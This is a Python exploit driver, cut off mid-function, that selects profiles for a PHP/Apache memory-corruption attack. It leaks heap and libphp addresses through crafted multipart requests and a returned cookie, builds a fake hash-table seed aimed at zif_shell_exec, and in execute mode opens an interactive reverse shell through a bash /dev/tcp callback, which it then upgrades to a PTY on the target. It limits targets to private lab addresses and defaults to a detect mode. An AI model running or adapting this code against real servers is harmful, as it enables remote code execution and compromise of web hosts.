#!/usr/bin/env python3
"""Automatic profile selection for proved PHP HTTP leak/terminal profiles.

Selection is evidence based.  HTTP banners only filter candidates; a profile
is selected only after its frozen A1/B1 pair returns the exact authenticated
cookie shape, unique aligned heap/code bases, and a healthy response through
the same pinned Apache worker lane. Leak-ready HOLD entries are detect-only;
only independently terminal-ready entries can enter safe/execute. No terminal
request is sent in the default ``detect`` mode.
"""

from __future__ import annotations

import argparse
import hashlib
import ipaddress
import json
import os
import re
import socket
import struct
import time
from pathlib import Path

import remote_cookie_shell as proved
import remote_exploit as remote
from worker_selector import (PreforkWorkerSelector, WorkerSelectionError,
                             open_holder)


HERE = Path(__file__).resolve().parent
DEFAULT_REGISTRY = HERE / "auto_profiles_v2.json"
KNOWN_IMPLEMENTATIONS = {
    "php854-fanchor-v1",
    "php8335-fanchor-leak-v1",
    "php8335-fanchor-v1",
}
PRIVATE_NETWORKS = tuple(ipaddress.ip_network(item) for item in (
    "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "::1/128", "fc00::/7"))


class SelectionStopped(RuntimeError):
    pass


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def integer(value) -> int:
    return int(value, 0) if isinstance(value, str) else int(value)


def status_line(response: bytes) -> str:
    return response.split(b"\r\n", 1)[0].decode("latin1", "replace") if response else ""


def status_code(response: bytes) -> int:
    try:
        return int(status_line(response).split(" ", 2)[1])
    except (IndexError, ValueError):
        return 0


def raw_headers(response: bytes) -> dict:
    result = {}
    head = response.split(b"\r\n\r\n", 1)[0]
    for line in head.split(b"\r\n")[1:]:
        if b":" not in line:
            continue
        name, value = line.split(b":", 1)
        key = name.decode("latin1", "replace").strip().lower()
        text = value.decode("latin1", "replace").strip()
        result[key] = text if key not in result else result[key] + "," + text
    return result


def safe_local_path(text: str) -> Path:
    base = HERE.resolve()
    path = (base / text).resolve()
    try:
        path.relative_to(base)
    except ValueError as exc:
        raise SelectionStopped(f"profile path escapes package: {text}") from exc
    return path


def require(condition: bool, message: str) -> None:
    if not condition:
        raise SelectionStopped(message)


def resolve_private_target(host: str, port: int) -> list[str]:
    """Require one literal private IPv4 lab target; never perform DNS."""
    try:
        address = ipaddress.ip_address(host)
    except ValueError as exc:
        raise SelectionStopped(
            "target must be a literal private IPv4 address") from exc
    require(address.version == 4, "target must be IPv4")
    require(any(address in network for network in PRIVATE_NETWORKS),
            f"refusing public target address {address}")
    return [str(address)]


def canonical_selection_key(profile: dict) -> str:
    observable = {
        "implementation": profile.get("implementation"),
        "worker_count": profile.get("worker_count"),
        "requests": {
            label: {
                key: profile.get("requests", {}).get(label, {}).get(key)
                for key in ("sha256", "boundary", "cookie", "path",
                            "allowed_statuses")
            }
            for label in ("a1", "b1")
        },
        "leak": profile.get("leak"),
        "zval_ptr_dtor": profile.get("offsets", {}).get("zval_ptr_dtor"),
    }
    encoded = json.dumps(
        observable, sort_keys=True, separators=(",", ":")).encode("utf-8")
    return sha256(encoded)


def canonical_terminal_key(profile: dict) -> str:
    terminal = {
        "zif_shell_exec": profile.get("offsets", {}).get("zif_shell_exec"),
        "terminal_backing": profile.get("offsets", {}).get("terminal_backing"),
        "terminal": profile.get("terminal"),
    }
    encoded = json.dumps(
        terminal, sort_keys=True, separators=(",", ":")).encode("utf-8")
    return sha256(encoded)


def capability(profile: dict, name: str) -> str:
    """Return the independently gated state for one profile capability."""
    return profile.get("capabilities", {}).get(name, "KILL")


def refresh_cage_preserving_lane(selector: PreforkWorkerSelector) -> dict:
    """Renew a large prefork cage without changing the selected child.

    The selected lane is occupied first. Each old holder is then replaced
    one-for-one while that child remains occupied, after which only the
    selected holder is released. This is required for the stock 150-worker
    profile because A1/B1 plus the terminal prime exceed Apache's request-read
    timeout on the original holder sockets.
    """
    started = time.monotonic()
    target_holder = open_holder(
        selector.host, selector.port, selector.connect_timeout)
    replaced = 0
    try:
        deadline = time.monotonic() + 8.0
        consecutive = 0
        attempt = 7000
        while time.monotonic() < deadline:
            status = selector._record_probe(
                selector.detected_worker_count or len(selector.sockets),
                attempt, selector.confirm_timeout)
            attempt += 1
            if status is None:
                consecutive += 1
                if consecutive == 2:
                    break
            else:
                consecutive = 0
            time.sleep(0.08)
        if consecutive != 2:
            raise WorkerSelectionError(
                "selected lane could not be occupied before cage refresh")
        for index, holder in enumerate(selector.sockets):
            if holder is None:
                continue
            try:
                holder.close()
            finally:
                selector.sockets[index] = None
            selector.sockets[index] = open_holder(
                selector.host, selector.port, selector.connect_timeout)
            replaced += 1
            time.sleep(selector.burst_open_settle)
        time.sleep(0.4)
    finally:
        target_holder.close()
    time.sleep(selector.release_settle)
    selector.lane_ready_status = selector._wait_lane_ready()
    selector._verify_unique_lane()
    return {
        "strategy": (
            "occupy selected lane; replace each old holder one-for-one; "
            "release selected lane; verify uniqueness"),
        "holders_replaced": replaced,
        "detected_workers": selector.detected_worker_count,
        "elapsed_seconds": time.monotonic() - started,
        "unique_lane_checks": selector.unique_lane_checks,
    }


def php8335_make_seed(backing: int, zif: int, command: str,
                      safe: bool) -> bytes:
    """Exact seed ABI independently proved on official PHP 8.3.35."""
    raw = command.encode("ascii")
    require(len(raw) <= 39, "callback command exceeds 39-byte seed limit")
    seed = bytearray(b"Q" * 295)
    fake_ht = backing + 0x80
    fake_string = backing + 0xE0
    bucket = 0x60 - 0x18
    struct.pack_into(
        "<QIIQQ", seed, bucket, fake_ht, 1 if safe else 0x307, 0, 0, 0)
    table = 0x80 - 0x18
    struct.pack_into(
        "<IIIIQIIIIQQ", seed, table,
        1, 7, 0x10, 0xFFFFFFF0,
        fake_ht, 1, 0, 8, 0, 1 << 32, zif)
    seed[table + 0x38:table + 0x50] = b"\0" * 0x18
    struct.pack_into("<QII", seed, table + 0x50,
                     fake_string, 0x106, 0)
    string = 0xE0 - 0x18
    struct.pack_into("<IIQQ", seed, string, 1, 6, 0, len(raw))
    seed[string + 0x18:string + 0x18 + len(raw)] = raw
    seed[string + 0x18 + len(raw)] = 0
    return bytes(seed)


def php8335_terminal_body(seed: bytes, terminal: dict) -> bytes:
    """Exact 905-filler terminal body proved on installed WordPress."""
    boundary = terminal["boundary"].encode("ascii")

    def part(headers: bytes, body: bytes = b"") -> bytes:
        return (b"--" + boundary + b"\r\n" + headers
                + b"\r\n\r\n" + body + b"\r\n")

    chunks = [
        part(b'Content-Disposition: form-data; name=""', seed),
        part(b'Content-Disposition: form-data; name="a"', b"1"),
    ]
    suffix = b"[a]" * 58
    for index in range(terminal["fillers"]):
        name = b"files[" + str(index).encode() + b"]" + suffix
        chunks.append(part(
            b'Content-Disposition: form-data; name="' + name
            + b'"; filename=""\r\nContent-Type: application/octet-stream'))
    chunks.append(part(
        b'Content-Disposition: form-data; name="'
        + b"A" * (700 * 1024) + b'[k]"', b"x"))
    chunks.append(b"--" + boundary + b"--\r\n")
    return b"".join(chunks)


def normalized_terminal_seed_sha256(seed: bytes) -> str:
    """Hash the terminal structure independently of ASLR/callback text."""
    normalized = bytearray(seed)
    for offset in (0x48, 0x78, 0x98, 0xB8):
        normalized[offset:offset + 8] = b"\0" * 8
    # Callback strings vary by private listener IP/port. Preserve and validate
    # their template separately, while the profile hash binds the surrounding
    # fake zend_string/call-frame layout.
    normalized[0xD8:0xE0] = b"\0" * 8
    normalized[0xE0:0x108] = b"\0" * 0x28
    return sha256(bytes(normalized))


def health_rule(profile: dict) -> dict:
    """Return the non-destructive post-leak health check for any profile."""
    if profile.get("health"):
        return profile["health"]
    terminal = profile.get("terminal", {})
    return {
        "path": terminal.get("health_path"),
        "allowed_statuses": terminal.get("health_allowed_statuses"),
    }


def profiles_for_mode(profiles: list[dict], mode: str) -> list[dict]:
    """Leak detection may use leak-ready HOLDs; terminal modes never may."""
    detectable = [profile for profile in profiles
                  if capability(profile, "leak") == "READY"]
    if mode == "detect":
        return detectable
    return [profile for profile in detectable
            if capability(profile, "terminal") == "READY"]


def validate_profile(profile: dict) -> dict:
    require(isinstance(profile.get("id"), str) and profile["id"], "profile id")
    require(profile.get("status") in ("READY", "HOLD", "KILL"), "profile status")
    require(profile.get("scope") in (
        "exact-lab-profile", "exact-official-image-profile"), "profile scope")
    require(profile.get("portability_status") in ("READY", "HOLD", "KILL"),
            "profile portability_status")
    require(isinstance(profile.get("non_default_dependencies"), list),
            "profile non_default_dependencies")
    require(profile.get("implementation") in KNOWN_IMPLEMENTATIONS, "profile implementation")
    capabilities = profile.get("capabilities", {})
    require(capabilities.get("leak") in ("READY", "HOLD", "KILL"),
            "profile leak capability")
    require(capabilities.get("terminal") in ("READY", "HOLD", "KILL"),
            "profile terminal capability")
    require(profile["status"] == capabilities["terminal"],
            "overall status must equal terminal capability")
    require(isinstance(profile.get("selection_signature"), str)
            and profile["selection_signature"], "profile selection label")
    require(isinstance(profile.get("worker_count"), int) and profile["worker_count"] > 0,
            "profile worker_count")
    require(profile.get("architecture") == "x86_64", "unsupported architecture")

    for label in ("a1", "b1"):
        request = profile.get("requests", {}).get(label, {})
        path = safe_local_path(request.get("body", ""))
        require(path.is_file(), f"{profile['id']} {label} body absent")
        digest = sha256(path.read_bytes())
        require(digest == request.get("sha256"), f"{profile['id']} {label} body hash")
        require(request.get("boundary") and request.get("path"), f"{profile['id']} {label} request")
        require(request.get("allowed_statuses"), f"{profile['id']} {label} statuses")
        request["_body_path"] = path

    leak = profile.get("leak", {})
    require(leak.get("cookie_length", 0) > 0, "leak cookie length")
    require(leak.get("hash_table_count", 0) >= 2, "leak table count")
    require(leak.get("hash_table_stride") == 56, "leak table stride")
    require(len(leak.get("hash_table_header", [])) == 4, "leak table header")
    require(len(leak.get("hash_table_shape", [])) == 5, "leak table shape")
    for name in ("main_chunk_alignment", "module_alignment"):
        alignment = integer(leak.get(name, 0x200000))
        require(alignment > 0 and alignment & (alignment - 1) == 0,
                f"leak {name}")
    if leak.get("ar_data_stride") is not None:
        require(integer(leak["ar_data_stride"]) > 0, "leak ar_data_stride")

    offsets = profile.get("offsets", {})
    require(integer(offsets.get("zval_ptr_dtor", 0)) > 0,
            "profile offset zval_ptr_dtor")

    health = health_rule(profile)
    require(health.get("path") and health.get("allowed_statuses"),
            "profile health rule")

    terminal = profile.get("terminal")
    if capability(profile, "terminal") == "READY":
        require(profile["status"] == "READY", "terminal READY profile status")
        require(isinstance(terminal, dict) and terminal.get("request_path"),
                "terminal request_path")
        for name in ("zif_shell_exec", "terminal_backing"):
            require(integer(offsets.get(name, 0)) > 0,
                    f"profile offset {name}")
    else:
        require(terminal is None, "non-READY profile must not contain terminal recipe")
        require("zif_shell_exec" not in offsets and "terminal_backing" not in offsets,
                "non-READY profile must not contain terminal offsets")

    if profile["implementation"] == "php854-fanchor-v1":
        require(capability(profile, "terminal") == "READY",
                "php854 implementation requires terminal READY")
        require(terminal.get("boundary") == proved.T_BOUNDARY.decode("ascii"),
                "implementation terminal boundary")
        require(terminal.get("fillers") == proved.FILLERS,
                "implementation terminal fillers")
    if profile["implementation"] == "php8335-fanchor-v1":
        require(capability(profile, "terminal") == "READY",
                "php8335 implementation requires terminal READY")
        require(terminal.get("boundary") == proved.T_BOUNDARY.decode("ascii"),
                "php8335 terminal boundary")
        require(terminal.get("fillers") == 905,
                "php8335 terminal fillers")
        require(terminal.get("refresh_lane_after_a1") is True,
                "php8335 A1 lane refresh")
        require(terminal.get("refresh_lane_after_b1") is True,
                "php8335 B1 lane refresh")
        require(terminal.get("safe_type_hex") == "0100",
                "php8335 safe type bytes")
        require(terminal.get("positive_type_hex") == "0703",
                "php8335 positive type bytes")
        require(re.fullmatch(r"[0-9a-f]{64}", terminal.get(
            "normalized_positive_seed_sha256", "")),
            "php8335 normalized seed hash")
        require(terminal.get("safe_terminal_statuses") == [500],
                "php8335 safe terminal statuses")
        require(integer(offsets.get("zval_ptr_dtor")) == 0x49EC50,
                "php8335 dtor offset")
        require(integer(offsets.get("zif_shell_exec")) == 0x3AC740,
                "php8335 shell_exec offset")
        require(integer(offsets.get("terminal_backing")) == 0x65140,
                "php8335 terminal backing")
    profile["_selection_key"] = canonical_selection_key(profile)
    profile["_terminal_key"] = canonical_terminal_key(profile)
    require(profile["selection_signature"] == profile["_selection_key"],
            "stored selection_signature does not match canonical profile")

    evidence_items = profile.get("evidence", {})
    evidence_hashes = evidence_items.get("sha256", {})
    for name, value in evidence_items.items():
        if name == "sha256":
            continue
        require(isinstance(value, str) and value, f"profile evidence {name}")
        evidence = safe_local_path(value)
        require(evidence.is_file(), f"profile evidence {name}")
        expected = evidence_hashes.get(name)
        if expected is not None:
            require(sha256(evidence.read_bytes()) == expected,
                    f"profile evidence hash {name}")

    if (capability(profile, "leak") == "READY" and
            capability(profile, "terminal") != "READY"):
        for name in ("leak_positive", "positive_cookie", "fixed_control",
                     "fixed_cookie", "no_progress_control",
                     "no_progress_cookie", "source_verification",
                     "offline_verifier"):
            require(name in evidence_items, f"leak HOLD evidence {name}")

    if capability(profile, "terminal") == "READY":
        for name in ("safe_control", "positive_shell", "verifier"):
            require(name in evidence_items, f"READY profile evidence {name}")
        if profile["implementation"] == "php8335-fanchor-v1":
            safe_receipt = json.loads(safe_local_path(
                evidence_items["safe_control"]).read_text("utf-8"))
            positive_receipt = json.loads(safe_local_path(
                evidence_items["positive_shell"]).read_text("utf-8"))
            expected_normalized = terminal["normalized_positive_seed_sha256"]
            require(safe_receipt.get("status") == "SAFE_CONTROL_PASS",
                    "php8335 safe evidence status")
            require(safe_receipt.get("callbacks") == 0,
                    "php8335 safe evidence callbacks")
            require(safe_receipt.get("health", {}).get("status") ==
                    "HTTP/1.1 200 OK", "php8335 safe evidence health")
            require(safe_receipt.get("terminal_response", {}).get("status") ==
                    "HTTP/1.0 500 Internal Server Error",
                    "php8335 safe evidence terminal response")
            require(positive_receipt.get("status") ==
                    "INTERACTIVE_REVERSE_SHELL",
                    "php8335 positive evidence status")
            safe_terminal = safe_receipt.get("terminal", {})
            positive_terminal = positive_receipt.get("terminal", {})
            require(safe_terminal.get("normalized_positive_seed_sha256") ==
                    positive_terminal.get("normalized_positive_seed_sha256"),
                    "php8335 frozen normalized seed identity")
            require(safe_terminal.get("command") ==
                    positive_terminal.get("command"),
                    "php8335 safe/positive command")
            for label, row in (("safe", safe_terminal),
                               ("positive", positive_terminal)):
                regenerated = php8335_make_seed(
                    int(row["backing"], 16), int(row["zif_shell_exec"], 16),
                    row["command"], False)
                require(sha256(regenerated) == row["positive_seed_sha256"],
                        f"php8335 {label} positive seed bytes")
                require(normalized_terminal_seed_sha256(regenerated) ==
                        expected_normalized,
                        f"php8335 {label} structural seed")
            require(safe_receipt.get("terminal", {}).get(
                "safe_delta_offsets") == [80, 81],
                "php8335 safe seed delta")
            require(positive_receipt.get("terminal", {}).get(
                "safe_delta_offsets") == [80, 81],
                "php8335 positive seed delta")
    return profile


def load_registry(path: Path) -> list[dict]:
    document = json.loads(path.read_text(encoding="utf-8"))
    require(document.get("schema") == "q618-auto-profiles-v2", "profile schema")
    profiles = document.get("profiles")
    require(isinstance(profiles, list) and profiles, "profile list")
    seen = set()
    leak_signatures = {}
    result = []
    for profile in profiles:
        validate_profile(profile)
        require(profile["id"] not in seen, "duplicate profile id")
        seen.add(profile["id"])
        if capability(profile, "leak") == "READY":
            key = profile["_selection_key"]
            if key in leak_signatures:
                prior = leak_signatures[key]
                if (capability(prior, "terminal") == "READY" and
                        capability(profile, "terminal") == "READY"):
                    require(prior["_terminal_key"] == profile["_terminal_key"],
                            "observable READY signature has divergent terminal")
                raise SelectionStopped("duplicate leak-ready observable signature")
            leak_signatures[key] = profile
        result.append(profile)
    return sorted(result, key=lambda item: int(item.get("priority", 0)), reverse=True)


def fingerprint_match(profile: dict, status: int, headers: dict) -> tuple[bool, dict]:
    rule = profile["fingerprint"]
    server = headers.get("server", "")
    powered = headers.get("x-powered-by", "")
    reasons = []
    allowed = status in rule["allowed_statuses"]
    if not allowed:
        reasons.append(f"status {status} not in {rule['allowed_statuses']}")
    if server and not re.search(rule["server_regex"], server, re.I):
        allowed = False
        reasons.append(f"Server mismatch: {server}")
    if powered:
        if not re.search(rule["php_regex"], powered, re.I):
            allowed = False
            reasons.append(f"X-Powered-By mismatch: {powered}")
    elif rule.get("missing_php_header") != "candidate_only":
        allowed = False
        reasons.append("X-Powered-By absent")
    else:
        reasons.append("X-Powered-By absent; active leak required")
    return allowed, {
        "path": rule["path"],
        "status": status,
        "server": server,
        "x_powered_by": powered,
        "candidate": allowed,
        "reasons": reasons,
    }


def derive_cookie(cookie: bytes, profile: dict):
    leak = profile["leak"]
    expected_prefix = bytes.fromhex(leak["cookie_prefix_hex"])
    require(len(cookie) == leak["cookie_length"], "cookie length")
    require(cookie.startswith(expected_prefix), "cookie prefix")
    tables = []
    for index in range(leak["hash_table_count"]):
        offset = leak["hash_table_offset"] + index * leak["hash_table_stride"]
        require(offset + 56 <= len(cookie), "cookie HashTable bounds")
        fields = struct.unpack_from("<IIIIQIIIIqQ", cookie, offset)
        require(list(fields[:4]) == leak["hash_table_header"], f"HashTable {index} header")
        require(list(fields[5:10]) == leak["hash_table_shape"], f"HashTable {index} shape")
        tables.append(fields)

    destructors = {table[10] for table in tables}
    main_alignment = integer(leak.get("main_chunk_alignment", 0x200000))
    module_alignment = integer(leak.get("module_alignment", 0x200000))
    chunks = {table[4] & ~(main_alignment - 1) for table in tables}
    require(len(destructors) == 1, "destructor ambiguity")
    require(len(chunks) == 1, "main ambiguity")
    destructor = next(iter(destructors))
    main = next(iter(chunks))
    require(0x100000000000 <= destructor < 0x800000000000, "destructor canonical range")
    require(0x100000000000 <= main < 0x800000000000, "main canonical range")
    dtor_offset = integer(profile["offsets"]["zval_ptr_dtor"])
    libphp = destructor - dtor_offset
    require((main & (main_alignment - 1)) == 0, "main alignment")
    require((libphp & (module_alignment - 1)) == 0, "libphp alignment")
    ar_data = [table[4] for table in tables]
    require(all((value & ~(main_alignment - 1)) == main for value in ar_data),
            "arData main cluster")
    if leak.get("ar_data_stride") is not None:
        stride = integer(leak["ar_data_stride"])
        require(all(ar_data[index + 1] - ar_data[index] == stride
                    for index in range(len(ar_data) - 1)), "arData stride")
    if leak.get("require_pointers_absent_from_requests"):
        request_bytes = b"".join(
            profile["requests"][label]["_body_path"].read_bytes()
            for label in ("a1", "b1"))
        for index, value in enumerate(ar_data):
            require(struct.pack("<Q", value) not in request_bytes,
                    f"HashTable {index} arData present in requests")
        require(struct.pack("<Q", destructor) not in request_bytes,
                "destructor present in requests")
    return main, libphp, destructor, ar_data


def save_raw_response(out: Path, label: str, response: bytes, complete: bool, error):
    (out / f"{label}.response.raw").write_bytes(response)
    headers = raw_headers(response)
    return {
        "status": status_line(response),
        "status_code": status_code(response),
        "bytes": len(response),
        "sha256": sha256(response),
        "complete": complete,
        "error": error,
        "server": headers.get("server"),
        "x_powered_by": headers.get("x-powered-by"),
    }


def send_profile_request(host: str, port: int, request: dict, out: Path, label: str):
    response, complete, error = proved.chunked(
        host,
        port,
        request["path"],
        request["_body_path"],
        request["boundary"].encode("ascii"),
        request["cookie"],
        out / f"{label}.request-head.raw",
    )
    record = save_raw_response(out, label, response, complete, error)
    require(complete and error is None, f"{label} transport: {error}")
    require(record["status_code"] in request["allowed_statuses"],
            f"{label} status {record['status_code']}")
    return response, record


def callback_command(host: str, port: int, profile: dict) -> str:
    address = ipaddress.ip_address(host)
    require(address.version == 4, "callback must be IPv4")
    require(any(address in network for network in PRIVATE_NETWORKS),
            "callback must be private or loopback IPv4")
    terminal = profile["terminal"]
    require(terminal["callback_port_min"] <= port <= terminal["callback_port_max"],
            "callback port outside selected profile")
    command = f"bash -c 'sh -i<>/dev/tcp/{int(address)}/{port}'"
    require(len(command.encode("ascii")) <= terminal["command_max_bytes"],
            "callback command too long")
    return command


def terminal_stage(host, port, callback_host, callback_port, profile, mode,
                   main, libphp, out, receipt):
    terminal = profile["terminal"]
    prime = remote.request_once(host, port, "GET", terminal["prime_path"], accept=False)
    remote.save_exchange(out, "prime", "GET", terminal["prime_path"], port, prime)
    receipt["prime"] = {
        "status": prime.status,
        "bytes": len(prime.body),
        "location": prime.headers.get("location"),
    }
    require(prime.status in terminal["prime_allowed_statuses"], "prime status")

    command = callback_command(callback_host, callback_port, profile)
    backing = main + integer(profile["offsets"]["terminal_backing"])
    zif = libphp + integer(profile["offsets"]["zif_shell_exec"])
    safe = mode == "safe"
    if profile["implementation"] == "php8335-fanchor-v1":
        positive_seed = php8335_make_seed(backing, zif, command, False)
        safe_seed = php8335_make_seed(backing, zif, command, True)
    else:
        positive_seed = proved.make_seed(backing, zif, command, False)
        safe_seed = proved.make_seed(backing, zif, command, True)
    seed = safe_seed if safe else positive_seed
    delta = [index for index, pair in enumerate(zip(positive_seed, safe_seed))
             if pair[0] != pair[1]]
    require(delta == [80, 81], f"safe seed delta {delta}")
    require(positive_seed[80:82].hex() == terminal.get(
        "positive_type_hex", "0703"), "positive seed type bytes")
    if safe:
        require(seed[80:82].hex() == terminal.get("safe_type_hex", "0100"),
                "safe seed type bytes")
    if profile["implementation"] == "php8335-fanchor-v1":
        normalized_seed = normalized_terminal_seed_sha256(positive_seed)
        require(normalized_seed == terminal["normalized_positive_seed_sha256"],
                "positive seed normalized template")
        body = php8335_terminal_body(seed, terminal)
    else:
        normalized_seed = None
        body = proved.terminal(seed)
    (out / "terminal.seed.bin").write_bytes(seed)
    (out / "terminal.body.bin").write_bytes(body)
    connection = remote.core.PersistentHTTP(
        host, port, timeout=60, connection_header="close")
    try:
        receipt["terminal_armed"] = True
        remote.write_json(out / "receipt.json", receipt)
        connection.send(
            "POST", terminal["request_path"], body=body,
            content_type=f"multipart/form-data; boundary={terminal['boundary']}",
            read_response=False)
        (out / "terminal.request.raw").write_bytes(
            connection.last_request_head + body)
        receipt["terminal"] = {
            "seed_sha256": sha256(seed),
            "body_sha256": sha256(body),
            "body_bytes": len(body),
            "backing": f"0x{backing:x}",
            "zif_shell_exec": f"0x{zif:x}",
            "command": command,
            "bucket_type": "IS_NULL" if safe else "IS_ARRAY_EX",
            "positive_seed_sha256": sha256(positive_seed),
            "normalized_positive_seed_sha256": normalized_seed,
            "safe_delta_offsets": delta,
            "safe_hex": safe_seed[80:82].hex(),
            "positive_hex": positive_seed[80:82].hex(),
            "request_complete": True,
            "safe_control_delta": {
                "offsets": [80, 81],
                "positive_hex": "0703",
                "control_hex": "0100",
            } if safe else None,
        }
        remote.write_json(out / "receipt.json", receipt)
        return connection
    except Exception:
        connection.close()
        raise


def fingerprint_target(host: str, port: int, profiles: list[dict], out: Path):
    results = {}
    by_path = {}
    for profile in profiles:
        by_path.setdefault(profile["fingerprint"]["path"], []).append(profile)
    for index, (path, related) in enumerate(by_path.items()):
        methods = {item["fingerprint"].get("method", "OPTIONS") for item in related}
        require(len(methods) == 1, f"ambiguous fingerprint methods for {path}")
        method = next(iter(methods))
        response = remote.request_once(host, port, method, path, accept=False)
        remote.save_exchange(out, f"fingerprint-{index}", method, path, port, response)
        for profile in related:
            match, evidence = fingerprint_match(
                profile, response.status, response.headers)
            results[profile["id"]] = {"match": match, **evidence}
    return results


def try_profile(host, port, profile, attempt_root, args, listener, receipt,
                operation_mode="detect"):
    requested_workers = args.workers
    selector = PreforkWorkerSelector(
        host,
        port,
        worker_count=requested_workers,
        release_index=args.release_index,
        max_workers=args.worker_cap,
    )
    with selector:
        evidence = selector.evidence()
        detected = evidence["detected_worker_count"]
        require(detected == profile["worker_count"],
                f"worker count {detected} does not match {profile['worker_count']}")
        receipt["selector"] = evidence
        remote.write_json(attempt_root / "receipt.json", receipt)

        a1_response, a1_record = send_profile_request(
            host, port, profile["requests"]["a1"], attempt_root, "a1")
        receipt["a1"] = a1_record
        selector.assert_unique_lane()
        if (operation_mode != "detect" and
                profile.get("terminal", {}).get("refresh_lane_after_a1")):
            receipt["cage_refresh_after_a1"] = refresh_cage_preserving_lane(selector)
        b1_response, b1_record = send_profile_request(
            host, port, profile["requests"]["b1"], attempt_root, "b1")
        receipt["b1"] = b1_record
        powered = b1_record.get("x_powered_by")
        if powered:
            require(re.search(profile["fingerprint"]["php_regex"], powered, re.I),
                    f"active PHP header mismatch: {powered}")
        wire, cookie = proved.get_cookie(b1_response)
        (attempt_root / "b1.cookie.bin").write_bytes(cookie)
        main, libphp, destructor, ar_data = derive_cookie(cookie, profile)
        receipt["http_leak"] = {
            "wire_len": len(wire),
            "decoded_len": len(cookie),
            "decoded_sha256": sha256(cookie),
            "main": f"0x{main:x}",
            "libphp": f"0x{libphp:x}",
            "zval_ptr_dtor": f"0x{destructor:x}",
            "arData": [f"0x{value:x}" for value in ar_data],
        }

        if (operation_mode != "detect" and
                profile.get("terminal", {}).get("refresh_lane_after_b1")):
            receipt["cage_refresh_after_b1"] = refresh_cage_preserving_lane(selector)

        health_spec = health_rule(profile)
        health_path = health_spec["path"]
        if operation_mode == "detect":
            health_response = remote.request_once(
                host, port, "GET", health_path, accept=False)
            remote.save_exchange(
                attempt_root, "selection-health", "GET", health_path,
                port, health_response)
            receipt["selection_health"] = {
                "status": health_response.status,
                "bytes": len(health_response.body),
            }
            require(
                health_response.status in health_spec["allowed_statuses"],
                "selection health")
            selector.assert_unique_lane()
        else:
            receipt["selection_health"] = {
                "skipped": True,
                "reason": "preserve proved B1-to-prime terminal geometry",
            }
        receipt["selector"] = selector.evidence()
        receipt["selected"] = True
        receipt["status"] = (
            "PROFILE_SELECTED" if capability(profile, "terminal") == "READY"
            else "LEAK_PROFILE_MATCHED_HOLD")
        remote.write_json(attempt_root / "receipt.json", receipt)

        if operation_mode == "detect":
            return {"receipt": receipt, "connection": None}

        connection = terminal_stage(
            host, port, args.callback_host, args.callback_port, profile,
            operation_mode, main, libphp, attempt_root, receipt)
        shell, peer = remote.core.accept_target(
            listener, host, 5 if operation_mode == "safe" else 60)
        if operation_mode == "safe":
            if shell is not None:
                shell.close()
                connection.close()
                raise SelectionStopped("safe control received callback")
            explicit_response_gate = "safe_terminal_statuses" in profile["terminal"]
            if explicit_response_gate:
                terminal_response = connection.read_response()
                receipt["terminal_response"] = {
                    "status": terminal_response.status,
                    "status_line": terminal_response.status_line,
                    "bytes": len(terminal_response.body),
                    "body_sha256": sha256(terminal_response.body),
                }
                require(terminal_response.status in
                        profile["terminal"]["safe_terminal_statuses"],
                        "safe terminal response")
                connection.close()
                if profile["terminal"].get("refresh_lane_after_b1"):
                    selector.assert_unique_lane()
            health = remote.request_once(host, port, "GET", health_path, accept=False)
            remote.save_exchange(
                attempt_root, "safe-health", "GET", health_path, port, health)
            require(health.status in health_rule(profile)["allowed_statuses"],
                    "safe health")
            receipt["safe_health"] = {
                "status": health.status,
                "bytes": len(health.body),
            }
            receipt["callbacks"] = 0
            receipt["status"] = "AUTO_SAFE_CONTROL_PASS"
            if not explicit_response_gate:
                connection.close()
            remote.write_json(attempt_root / "receipt.json", receipt)
            return {"receipt": receipt, "connection": None}

        if shell is None:
            connection.close()
            raise SelectionStopped("no callback")
        print(f"reverse shell {peer[0]}:{peer[1]}", flush=True)
        # Upgrade the raw callback to a target-side PTY. The visible prompt
        # and command echo therefore come from the compromised container.
        shell.sendall(
            b"exec 1>&0 2>&0\n"
            b"exec script -qfc /bin/bash /dev/null\n")
        transcript = attempt_root / "session.raw"
        transcript.touch(mode=0o600)
        receipt.update({
            "status": "CONNECTED_INTERACTIVE_REVERSE_SHELL",
            "peer": f"{peer[0]}:{peer[1]}",
            "transcript": str(transcript),
            "exit_command_sent": False,
        })
        remote.write_json(attempt_root / "receipt.json", receipt)
        try:
            with transcript.open("ab", buffering=0) as stream:
                reason = remote.core.interactive_shell(shell, stream)
        finally:
            shell.close()
            connection.close()
        data = transcript.read_bytes()
        receipt.update({
            "status": "AUTO_INTERACTIVE_REVERSE_SHELL",
            "disconnect_reason": reason,
            "transcript_bytes": len(data),
            "transcript_sha256": sha256(data),
        })
        remote.write_json(attempt_root / "receipt.json", receipt)
        return {"receipt": receipt, "connection": None}


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", nargs="?")
    parser.add_argument("callback", nargs="?")
    parser.add_argument("--mode", choices=("detect", "safe", "execute"),
                        default="detect")
    parser.add_argument("--profiles", type=Path, default=DEFAULT_REGISTRY)
    parser.add_argument("--profile-id")
    parser.add_argument("--workers", type=int,
                        help="verified worker count; omission uses bounded discovery")
    parser.add_argument("--worker-cap", type=int, default=256)
    parser.add_argument("--release-index", type=int, default=0)
    parser.add_argument("--attempts", type=int, choices=(1, 2), default=1)
    parser.add_argument("--try-unfingerprinted", action="store_true")
    parser.add_argument("--list-profiles", action="store_true")
    args = parser.parse_args()
    if args.list_profiles:
        return args
    if not args.target:
        parser.error("target is required")
    if args.mode != "detect" and not args.callback:
        parser.error("callback is required for safe/execute mode")
    host, port = remote.core.split_endpoint(args.target, 80, "target")
    args.host, args.port = host, port
    args.callback_host = args.callback_port = None
    if args.callback:
        args.callback_host, args.callback_port = remote.core.split_endpoint(
            args.callback, None, "callback")
    if args.workers is not None and args.workers < 1:
        parser.error("--workers must be positive")
    if args.worker_cap < 1:
        parser.error("--worker-cap must be positive")
    return args


def run_terminal_candidate(args, profile, run_root, receipt, receipt_path):
    """Validate and arm one unambiguous profile on the same pinned lane."""
    callback_command(args.callback_host, args.callback_port, profile)
    listener = remote.core.open_listener(args.callback_host, args.callback_port)
    terminal_root = run_root / f"{profile['id']}-{args.mode}"
    terminal_root.mkdir(mode=0o700)
    terminal_receipt = {
        "status": "UNAMBIGUOUS_PROFILE_VALIDATION",
        "mode": args.mode,
        "profile_id": profile["id"],
        "selection_signature": profile["_selection_key"],
        "selection_basis": (
            "single fingerprint-compatible READY profile; exact active cookie "
            "validator; terminal continues on the same pinned lane"),
